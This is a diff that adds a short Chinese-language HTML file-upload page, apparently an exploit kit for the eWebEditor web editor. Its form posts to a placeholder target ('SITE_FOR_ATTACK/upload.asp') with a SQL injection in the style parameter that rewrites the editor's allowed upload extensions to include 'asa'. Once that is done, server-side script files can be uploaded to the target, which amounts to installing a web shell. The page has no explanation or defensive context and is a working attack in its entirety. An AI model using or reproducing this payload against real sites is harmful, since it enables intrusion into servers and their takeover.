@@ -1,0 +1,19 @@
+<HTML>
+<HEAD>
+<TITLE>文件上传</TITLE>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<style type="text/css">
+body, a, table, div, span, td, th, input, select{font:9pt;font-family: "宋体", Verdana, Arial, Helvetica, sans-serif;}
+body {padding:0px;margin:0px}
+</style>
+
+</head>
+<body bgcolor=menu>司
+
+<form action="http://SITE_FOR_ATTACK/upload.asp?action=save&type=image&style=s_popup' union select 1,2,3,4,S_UploadDir,6,7,8,9,10,11, ([S_ImageExt]%2b'|asa'),13,14,15,16,17,18,19,20,21 from ewebeditor_style where s_name='standard' and 'a'='a" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=1 style="width:100%" onChange="originalfile.value=this.value">
+<input type=hidden name=originalfile value=""><input name="" type="submit" value="提交">
+</form>
+
+</body>
+</html>
